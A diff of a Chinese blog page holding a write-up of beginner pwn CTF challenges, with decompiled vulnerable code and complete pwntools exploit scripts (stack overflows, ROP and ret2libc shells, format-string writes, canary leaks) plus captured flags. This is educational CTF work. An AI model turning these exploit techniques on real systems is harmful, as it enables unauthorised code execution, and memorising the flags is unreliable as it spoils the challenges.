@@ -428,23 +428,24 @@
         <div class="article-entry" itemprop="articleBody">
           
           <p>一直做re觉得有些枯燥，闲着没事做一做好久没碰的pwn</p>
-<a id="more"></a>
+<span id="more"></span>
 
 <h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><p><code>checksec</code>一下，开了NX</p>
 <pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)
-{
+&#123;
   vulnerable_function();
   system(&quot;echo &#39;Hello World!&#39;&quot;);
   return 0;
-}
+&#125;
 
 ssize_t vulnerable_function()
-{
+&#123;
   char buf; // [esp+0h] [ebp-88h]
 
   system(&quot;echo Input:&quot;);
   return read(0, &amp;buf, 0x100u);
-}</code></pre>
+&#125;
+</code></pre>
 <p>程序中调用了system，在字符串视图里也找到了<code>&quot;/bin/sh&quot;</code>，所以构造一个ROP就可以，exp如下</p>
 <pre><code class="python">from pwn import *
 io=process(&#39;./level2&#39;)
@@ -458,9 +459,10 @@ sh_addr=elf.search(&#39;/bin/sh&#39;).next()
 payload=&#39;a&#39;*(0x88+4)+p32(sys_addr)+p32(0)+p32(sh_addr)
 
 io.sendline(payload)
-io.interactive()</code></pre>
+io.interactive()
+</code></pre>
 <h4 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h4><pre><code class="c++">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
-{
+&#123;
   FILE *v3; // rdi
   const char *v4; // rdi
   int v6; // [rsp+4h] [rbp-3Ch]
@@ -487,23 +489,24 @@ io.interactive()</code></pre>
   v4 = (const char *)seed[0];
   srand(seed[0]);
   for ( i = 0; i &lt;= 9; ++i )
-  {
+  &#123;
     v8 = rand() % 6 + 1;
     printf(&quot;-------------Turn:%d-------------\n&quot;, (unsigned int)(i + 1));
     printf(&quot;Please input your guess number:&quot;);
     __isoc99_scanf(&quot;%d&quot;, &amp;v6);
     puts(&quot;---------------------------------&quot;);
     if ( v6 != v8 )
-    {
+    &#123;
       puts(&quot;GG!&quot;);
       exit(1);
-    }
+    &#125;
     v4 = &quot;Success!&quot;;
     puts(&quot;Success!&quot;);
-  }
+  &#125;
   sub_C3E(v4);
   return 0LL;
-}</code></pre>
+&#125;
+</code></pre>
 <p>这里首先看到是猜随机生成的数，然后如果所有的数都猜对了，就调用最后一个函数输出flag，首先的想法就是要替换掉seed，变成我们已知的数字，就可以调用相同版本的libc里的随机数生成函数，来生成同样的数，exp如下:</p>
 <pre><code class="python">from pwn import *
 from ctypes import *
@@ -521,9 +524,10 @@ for i in range(10):
     io.recvuntil(&#39;number:&#39;)
     io.sendline(num)
 
-io.interactive()</code></pre>
+io.interactive()
+</code></pre>
 <h4 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h4><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)
-{
+&#123;
   int v4; // [esp+Ch] [ebp-Ch]
 
   setbuf(stdin, 0);
@@ -537,23 +541,24 @@ io.interactive()</code></pre>
   printf(&quot;Your choice:&quot;);
   __isoc99_scanf(&quot;%d&quot;, &amp;v4);
   if ( v4 == 1 )
-  {
+  &#123;
     login();
-  }
+  &#125;
   else
-  {
+  &#123;
     if ( v4 == 2 )
-    {
+    &#123;
       puts(&quot;Bye~&quot;);
       exit(0);
-    }
+    &#125;
     puts(&quot;Invalid Choice!&quot;);
-  }
+  &#125;
   return 0;
-}</code></pre>
+&#125;
+</code></pre>
 <p>肯定选择1，进入<code>login()</code>函数</p>
 <pre><code class="c++">int login()
-{
+&#123;
   char buf; // [esp+0h] [ebp-228h]
   char s; // [esp+200h] [ebp-28h]
 
@@ -565,33 +570,35 @@ io.interactive()</code></pre>
   puts(&quot;Please input your passwd:&quot;);
   read(0, &amp;buf, 0x199u);
   return check_passwd(&amp;buf);
-}
+&#125;
 
 char *__cdecl check_passwd(char *s)
-{
+&#123;
   char *result; // eax
   char dest; // [esp+4h] [ebp-14h]
   unsigned __int8 v3; // [esp+Fh] [ebp-9h]
 
   v3 = strlen(s);
   if ( v3 &lt;= 3u || v3 &gt; 8u )
-  {
+  &#123;
     puts(&quot;Invalid Password&quot;);
     result = (char *)fflush(stdout);
-  }
+  &#125;
   else
-  {
+  &#123;
     puts(&quot;Success&quot;);
     fflush(stdout);
     result = strcpy(&amp;dest, s);
-  }
+  &#125;
   return result;
-}</code></pre>
+&#125;
+</code></pre>
 <p>然后发现了一个奇怪的函数，可以利用</p>
 <pre><code class="c++">int what_is_this()
-{
+&#123;
   return system(&quot;cat flag&quot;);
-}</code></pre>
+&#125;
+</code></pre>
 <p>按理说我们只需要覆盖掉<code>check_passwd()</code>的返回值，然后伪造system栈帧就可以了，但是这里限制了我们输入的长度，但是观察汇编之后发现这个变量值是从<code>al</code>寄存器<code>mov</code>过来的，只能存储0-255的数字，因此我们可以输入259-263之间的字符数，就可以实现我们的目标，exp如下:</p>
 <pre><code class="python">from pwn import *
 elf=ELF(&#39;./int_overflow&#39;)
@@ -607,19 +614,20 @@ payload=&#39;a&#39;*0x14+&#39;a&#39;*4+p32(sys_addr)
 payload=payload.ljust(263,&#39;a&#39;)
 io.send(payload)
 io.recv()
-io.interactive()</code></pre>
+io.interactive()
+</code></pre>
 <h4 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h4><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)
-{
+&#123;
   setbuf(stdin, 0);
   setbuf(stdout, 0);
   setbuf(stderr, 0);
   hello();
   puts(&quot;thank you&quot;);
   return 0;
-}
+&#125;
 
 char *hello()
-{
+&#123;
   char *v0; // eax
   signed int v1; // ebx
   unsigned int v2; // ecx
@@ -630,36 +638,37 @@ char *hello()
   v0 = &amp;s;
   v1 = 30;
   if ( (unsigned int)&amp;s &amp; 2 )
-  {
+  &#123;
     *(_WORD *)&amp;s = 0;
     v0 = (char *)&amp;v6;
     v1 = 28;
-  }
+  &#125;
   v2 = 0;
   do
-  {
+  &#123;
     *(_DWORD *)&amp;v0[v2] = 0;
     v2 += 4;
-  }
+  &#125;
   while ( v2 &lt; (v1 &amp; 0xFFFFFFFC) );
   v3 = &amp;v0[v2];
   if ( v1 &amp; 2 )
-  {
+  &#123;
     *(_WORD *)v3 = 0;
     v3 += 2;
-  }
+  &#125;
   if ( v1 &amp; 1 )
     *v3 = 0;
   puts(&quot;please tell me your name&quot;);
   fgets(name, 50, stdin);
   puts(&quot;hello,you can leave some message here:&quot;);
   return gets(&amp;s);
-}
+&#125;
 
 int pwn()
-{
+&#123;
   return system(&quot;echo hehehe&quot;);
-}</code></pre>
+&#125;
+</code></pre>
 <p>所有需要用到的函数都在这里，可以看到自带system函数，但是没有<code>/bin/sh</code>，所以需要手动构造，正好之前输入了一个<code>name</code>是一个全局变量，可以直接找到地址，以此构造ROP，exp如下：</p>
 <pre><code class="python">from pwn import *
 sh_addr=0x0804A080
@@ -671,7 +680,8 @@ io.sendlineafter(&#39;please tell me your name&#39;,&#39;/bin/sh&#39;)
 io.recvuntil(&#39;hello,you can leave some message here:&#39;)
 payload=&#39;a&#39;*0x26+p32(0)+p32(sys_addr)+p32(0)+p32(sh_addr)
 io.sendline(payload)
-io.interactive()</code></pre>
+io.interactive()
+</code></pre>
 <h4 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h4><p>简单的栈溢出，经典题目，有膜法</p>
 <pre><code class="python">from pwn import *
 
@@ -681,7 +691,8 @@ io.sendlineafter(&#39;What\&#39;s Your Birth?&#39;,&#39;1000&#39;)
 io.recvuntil(&quot;What&#39;s Your Name?&quot;)
 payload=&#39;a&#39;*(0x20-0x18)+p64(1926)
 io.sendline(payload)
-io.interactive()</code></pre>
+io.interactive()
+</code></pre>
 <h4 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h4><p>比上一题更简单的溢出（半斤八两）</p>
 <pre><code class="python">from pwn import *
 # io=process(&#39;./hello_pwn&#39;)
@@ -689,7 +700,8 @@ io=remote(&#39;111.198.29.45&#39;,42456)
 io.recvuntil(&#39;bof&#39;)
 payload=&#39;a&#39;*4+p64(1853186401)
 io.sendline(payload)
-io.interactive()</code></pre>
+io.interactive()
+</code></pre>
 <h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>ret2libc，泄露一个函数地址然后算偏移，控制程序流程再执行一次漏洞函数，拿到shell</p>
 <pre><code class="python">from pwn import *
 from LibcSearcher import *
@@ -713,7 +725,8 @@ bin_sh_addr=libc_base+libc.dump(&#39;str_bin_sh&#39;)
 io.recv()
 payload=&#39;a&#39;*0x88+p32(0)+p32(sys_addr)+p32(0)+p32(bin_sh_addr)
 io.sendline(payload)
-io.interactive()</code></pre>
+io.interactive()
+</code></pre>
 <p>这里还有个问题没解决，在本地运行一直不行，但是在服务器端就可以拿到shell，暂时还不知道原因</p>
 <h4 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h4><p>也是很简单的一道题，但不知道为什么gdb和远程都能过，就是本地直接运行一直报segmentation fault</p>
 <pre><code class="python">from pwn import *
@@ -726,10 +739,11 @@ payload=&#39;a&#39;*(0x80+8)+p64(sys_addr)
 # print payload
 io.recv()
 io.send(payload)
-io.interactive()</code></pre>
+io.interactive()
+</code></pre>
 <h4 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h4><p>格式化字符串漏洞的利用</p>
 <pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)
-{
+&#123;
   int buf; // [esp+1Eh] [ebp-7Eh]
   int v5; // [esp+22h] [ebp-7Ah]
   __int16 v6; // [esp+26h] [ebp-76h]
@@ -752,16 +766,17 @@ io.interactive()</code></pre>
   puts(&quot;your message is:&quot;);
   printf(&amp;s);
   if ( pwnme == 8 )
-  {
+  &#123;
     puts(&quot;you pwned me, here is your flag:\n&quot;);
     system(&quot;cat flag&quot;);
-  }
+  &#125;
   else
-  {
+  &#123;
     puts(&quot;Thank you!&quot;);
-  }
+  &#125;
   return 0;
-}</code></pre>
+&#125;
+</code></pre>
 <p>两次输入，第一次只能输入10个字符，不够我们构造<code>payload</code>，所以利用第二次输入的格式化字符串漏洞实现任意地址可写，修改<code>pwnme</code>的值，<code>exp</code>如下：</p>
 <pre><code class="python">from pwn import *
 pwnme=0x0804A068
@@ -771,11 +786,14 @@ io=remote(&#39;111.198.29.45&#39;,37888)
 io.sendlineafter(&#39;name:&#39;,&#39;a&#39;)
 io.recvuntil(&#39;please:&#39;)
 io.sendline(payload)
-io.interactive()</code></pre>
+io.interactive()
+</code></pre>
 <p>很简单，直接输出flag</p>
-<pre><code>cyberpeace{428fd5c839a04a6d162bdd6610a094cf}</code></pre><h4 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h4><p>这道题简单的溢出就可以解决了</p>
+<pre><code>cyberpeace&#123;428fd5c839a04a6d162bdd6610a094cf&#125;
+</code></pre>
+<h4 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h4><p>这道题简单的溢出就可以解决了</p>
 <pre><code class="c++">int __cdecl main()
-{
+&#123;
   size_t v0; // ebx
   char v2[32]; // [esp+10h] [ebp-74h]
   int (*v3)(); // [esp+30h] [ebp-54h]
@@ -816,12 +834,12 @@ io.interactive()</code></pre>
   fflush(stdout);
   __isoc99_scanf(&quot;%s&quot;, v2);
   for ( i = 0; ; ++i )
-  {
+  &#123;
     v0 = i;
     if ( v0 &gt;= strlen(v2) )
       break;
     switch ( v14 )
-    {
+    &#123;
       case 1:
         if ( sub_8048702(v2[i]) )
           v14 = 2;
@@ -859,20 +877,22 @@ io.interactive()</code></pre>
         break;
       default:
         continue;
-    }
-  }
+    &#125;
+  &#125;
   (*(&amp;v3 + --v14))();
   return fflush(stdout);
-}</code></pre>
+&#125;
+</code></pre>
 <p>有两个输入的地方，第一个地方严格控制了输入的字符数，所以没什么用，第二个用了<code>scanf</code>，可以无限制的输入，利用这个地方来控制我们的程序。</p>
 <p>这个程序开了<code>NX</code>，所以找找有没有可以利用的函数，找到</p>
 <pre><code class="c++">int sub_80486CC()
-{
+&#123;
   char s; // [esp+1Eh] [ebp-3Ah]
 
   snprintf(&amp;s, 0x32u, &quot;cat %s&quot;, &quot;./flag&quot;);
   return system(&amp;s);
-}</code></pre>
+&#125;
+</code></pre>
 <p>接下来考虑怎么利用。程序最后会根据<code>v14</code>的值来判断该执行那个函数，看到有些人想要覆盖<code>v14</code>的值，我的做法就是保留<code>v14=1</code>然后去替换<code>v3</code>的值，因为即使替换掉<code>v14</code>，后面也会被修改。</p>
 <p>下一步就是要控制<code>v14</code>的值不变，我的做法是在写入的时候先写入一个<code>&#39;\0&#39;</code>，这样判断字符串长度的时候为0，直接跳出循环。<code>exp</code>如下：</p>
 <pre><code class="python">from pwn import *
@@ -883,11 +903,14 @@ io.sendline(&#39;a&#39;)
 payload=&#39;\0&#39;+&#39;A&#39;*0x1f+p32(0x80486cc)
 io.recvuntil(&#39;&gt;&#39;)
 io.sendline(payload)
-io.interactive()</code></pre>
+io.interactive()
+</code></pre>
 <p>得到flag</p>
-<pre><code>cyberpeace{3a2c567e832c79478c593e5f6f334830}</code></pre><h4 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h4><p>题目里面一共有两个漏洞，并且都标明出来了，不需要自己去找</p>
+<pre><code>cyberpeace&#123;3a2c567e832c79478c593e5f6f334830&#125;
+</code></pre>
+<h4 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h4><p>题目里面一共有两个漏洞，并且都标明出来了，不需要自己去找</p>
 <pre><code class="c++">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
-{
+&#123;
   int v3; // [rsp+24h] [rbp-Ch]
   unsigned __int64 v4; // [rsp+28h] [rbp-8h]
 
@@ -897,37 +920,38 @@ io.interactive()</code></pre>
   puts(&quot;[Great Fairy] level pwned &quot;);
   puts(&quot;Select your weapon &quot;);
   while ( 1 )
-  {
+  &#123;
     while ( 1 )
-    {
+    &#123;
       sub_4009DA();
       __isoc99_scanf(&quot;%d&quot;, &amp;v3);
       if ( v3 != 2 )
         break;
       sub_4008EB();
-    }
+    &#125;
     if ( v3 == 3 )
-    {
+    &#123;
       puts(&quot;Bye &quot;);
       exit(0);
-    }
+    &#125;
     if ( v3 == 1 )
       sub_400960();
     else
       puts(&quot;Wrong!&quot;);
-  }
-}
+  &#125;
+&#125;
 
 int sub_4009DA()
-{
+&#123;
   puts(&quot;1. Stack Bufferoverflow Bug &quot;);
   puts(&quot;2. Format String Bug &quot;);
   return puts(&quot;3. Exit the battle &quot;);
-}</code></pre>
+&#125;
+</code></pre>
 <p>选择2的话会进入一个包含格式化字符串漏洞的函数，选择1会进入一个有栈溢出漏洞的函数</p>
 <pre><code class="c++">//格式化字符串
 unsigned __int64 sub_4008EB()
-{
+&#123;
   char buf; // [rsp+0h] [rbp-90h]
   unsigned __int64 v2; // [rsp+88h] [rbp-8h]
 
@@ -936,11 +960,11 @@ unsigned __int64 sub_4008EB()
   read(0, &amp;buf, 0x7FuLL);
   printf(&amp;buf, &amp;buf);
   return __readfsqword(0x28u) ^ v2;
-}
+&#125;
 
 //栈溢出
 unsigned __int64 sub_400960()
-{
+&#123;
   char buf; // [rsp+0h] [rbp-90h]
   unsigned __int64 v2; // [rsp+88h] [rbp-8h]
 
@@ -949,13 +973,14 @@ unsigned __int64 sub_400960()
   read(0, &amp;buf, 0x100uLL);
   printf(&quot;-&gt; %s\n&quot;, &amp;buf);
   return __readfsqword(0x28u) ^ v2;
-}
+&#125;
 
 //目标函数
 int sub_4008DA()
-{
+&#123;
   return system(&quot;/bin/cat ./flag&quot;);
-}</code></pre>
+&#125;
+</code></pre>
 <p>如果<code>checksec</code>或者直接看到<code>v2</code>就可以发现，这个程序开了<code>cannary</code>保护，所以直接溢出是不行的，这时候可以考虑利用格式化字符串漏洞泄露<code>cannary</code>的值，因为进程没有中止就进入了下一个循环，所以<code>cannary</code>的值是不变的，这个时候选择利用栈溢出漏洞，覆盖返回地址为目标函数即可。这里虽然是64位，但是调用的函数没有参数，没必要构造很复杂的ROP链来控制程序执行流程。</p>
 <p><code>exp</code>如下：</p>
 <pre><code class="python">from pwn import *
@@ -975,9 +1000,12 @@ payload+=p64(cannary)
 payload+=p64(0)
 payload+=p64(sys_addr)
 io.sendline(payload)
-io.interactive()</code></pre>
+io.interactive()
+</code></pre>
 <p>得到flag</p>
-<pre><code>cyberpeace{8b06a4becaf5e73cd79ea7d283d0bd89}</code></pre>
+<pre><code>cyberpeace&#123;8b06a4becaf5e73cd79ea7d283d0bd89&#125;
+</code></pre>
+
           
             <div class='article_footer'>
               
@@ -1066,9 +1094,9 @@ io.interactive()</code></pre>
   <div class="-mob-share-list share-body">
     
       
-        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer"
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          href="http://connect.qq.com/widget/shareqq/index.html?url=http://blog.rycbar.club/2020/03/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/&title=攻防世界-pwn部分题解（一） - My Tiny Ideas&summary=一直做re觉得有些枯燥，闲着没事做一做好久没碰的pwn"
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://blog.rycbar.club/2020/03/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/&title=攻防世界-pwn部分题解（一） - My Tiny Ideas&summary=一直做re觉得有些枯燥，闲着没事做一做好久没碰的pwn"
           
           >
           
@@ -1078,9 +1106,9 @@ io.interactive()</code></pre>
       
     
       
-        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer"
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://blog.rycbar.club/2020/03/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/&title=攻防世界-pwn部分题解（一） - My Tiny Ideas&summary=一直做re觉得有些枯燥，闲着没事做一做好久没碰的pwn"
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://blog.rycbar.club/2020/03/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/&title=攻防世界-pwn部分题解（一） - My Tiny Ideas&summary=一直做re觉得有些枯燥，闲着没事做一做好久没碰的pwn"
           
           >
           
@@ -1090,9 +1118,9 @@ io.interactive()</code></pre>
       
     
       
-        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer"
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          href="http://service.weibo.com/share/share.php?url=http://blog.rycbar.club/2020/03/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/&title=攻防世界-pwn部分题解（一） - My Tiny Ideas&summary=一直做re觉得有些枯燥，闲着没事做一做好久没碰的pwn"
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://blog.rycbar.club/2020/03/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/&title=攻防世界-pwn部分题解（一） - My Tiny Ideas&summary=一直做re觉得有些枯燥，闲着没事做一做好久没碰的pwn"
           
           >
           
@@ -1270,13 +1298,13 @@ serial-150这题本身的算法没什么难度，主要就是花指令的去除�
       
     
       
-        <div><p>博客内容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
 </div>
       
     
       
         <div class='copyright'>
-        <p><a href="https://blog.rycbar.club">Copyright © 2017-2020 rycbar</a></p>
+        <p><a href="https://blog.rycbar.club/">Copyright © 2017-2020 rycbar</a></p>
 
         </div>
       
